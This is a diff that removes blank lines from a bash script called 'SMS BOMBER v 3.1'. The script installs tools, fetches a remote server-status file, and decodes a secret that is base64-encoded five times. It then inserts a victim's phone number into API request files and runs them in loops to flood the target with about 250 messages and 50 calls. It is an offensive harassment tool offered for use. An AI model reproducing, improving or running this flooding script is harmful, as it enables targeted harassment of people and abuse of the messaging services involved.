@@ -1,5 +1,4 @@
 #!/bin/bash
-
 #------------------------------------------------------#
 #                   SMS BOMBER v 3.1 !                 #
 #               Coded by SHAIK AFRID                   #
@@ -7,9 +6,7 @@
 #      Github     :   github.com/afridanon             #
 #                                                   #
 #------------------------------------------------------#
-
 # Colors FG
-
 RED="$(printf '\e[31m')"
 GREEN="$(printf '\e[32m')"
 ORANGE="$(printf '\e[33m')"
@@ -19,9 +16,7 @@ CYAN="$(printf '\e[36m')"
 WHITE="$(printf '\e[37m')"
 BLACK="$(printf '\e[30m')"
 echo "INSTALLING MODULES PLESE WAIT !"
-
 apt-get install -y git curl wget pv espeak
-
 clear
 printf "\e[1;33m      PLESE WAIT ......"
 just() {
@@ -33,8 +28,6 @@ echo ""
 echo ""
 echo ""
 }
-
-
 banner() {
 clear
 echo -e '''
@@ -74,9 +67,7 @@ echo ""
 echo -e "\e[1;91m                 Happy Hacking :)" | pv -qL 10
 sleep 7
 echo ""
-
 }
-
 rm .server.txt > /dev/null 2>&1
 wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt    > /dev/null 2>&1
 serverup="On"
@@ -108,8 +99,6 @@ exit
 exit
 exit
 fi
-
-
 bombrecord() {
 clear
 echo ""
@@ -123,31 +112,22 @@ echo " $GREEN"
 cat .bombrecord.txt
 exit
 }
-
 PW_WD=$(pwd)
 cd model
 cp headapis $PW_WD
 cp tailapis $PW_WD
 cp anonapi $PW_WD
 cd ..
-
 SECRET=VmtjMWQyTnJNSGROVlZab1pXdGFUMVZyV2tkT2JGSjFXa2hhVVZWWE9EbERaejA5Q2c9PQo=
 for i in {1..5}
 do SECRET=$(echo $SECRET | base64 --decode)
 done
-
-
-
 eexec() {
 echo "Under construction"
 exit
 }
-
 menu() {
 clear
-
-
-
 echo " $GREEN █▀ █▀▄▀█ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█"
 echo " $GREEN ▄█ █░▀░█ ▄█   █▄█ █▄█ █░▀░█ █▄█ ██▄ █▀▄"
 echo ""
@@ -177,7 +157,6 @@ echo -e "\e[92m[\e[91m~\e[92m]\e[93m Else it will automatically stop after 5 min
 echo ""
 echo -e "\e[92m[\e[91m~\e[92m]\e[93m After sending 250 msgs and 50 calls !!\e[93m"
 echo ""
-
 while read a; do
     echo ${a//€shushhi/$targett}
 done < headapis > headapis.t
@@ -187,15 +166,12 @@ while read a; do
     echo ${a//€shushhi/$targett}
 done < tailapis > tailapis.t
 mv tailapis{.t,}
-
 for i in {1..4}
 do bash headapis
 done
-
 for i in {1..27}
 do bash tailapis
 done
-
 exit 
 fi
 }
@@ -233,7 +209,5 @@ if [ "$options" -eq "2" ];then
 else
         menux
 fi
-
-
 }
 menux
